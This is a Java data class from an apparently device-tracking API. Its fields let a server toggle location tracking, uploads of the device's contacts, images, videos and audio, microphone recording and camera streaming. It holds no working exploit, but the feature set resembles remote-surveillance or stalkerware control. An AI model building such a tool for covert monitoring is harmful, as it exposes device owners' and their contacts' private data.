package com.manish.device_tracker_api.dto;

import lombok.Builder;
import lombok.Data;

@Data
@Builder
public class TrackingConfigResponse {

    // tracking location
    private Boolean trackingEnabled;
    private Integer trackingInterval;

    // contact
    private Boolean contactsUploaded;
    private Boolean refreshContacts;

    // images
    private Boolean imagesUploaded;
    private Boolean refreshImages;
    private String imageBucketId;
    private Integer imageLimit;
    private Integer imageOffset;
    private String imageOrder;

    // Videos
    private Boolean refreshVideos;
    private Boolean videosUploaded;

    // Audio
    private Boolean refreshAudios;
    private Boolean audiosUploaded;

    // Mic
    private Boolean micUploaded;
    private Boolean refreshMic;
    private Integer micDuration;

    // Camera
    private Boolean refreshCamera;
    private Boolean cameraStreaming;
    private String cameraSessionId;

}
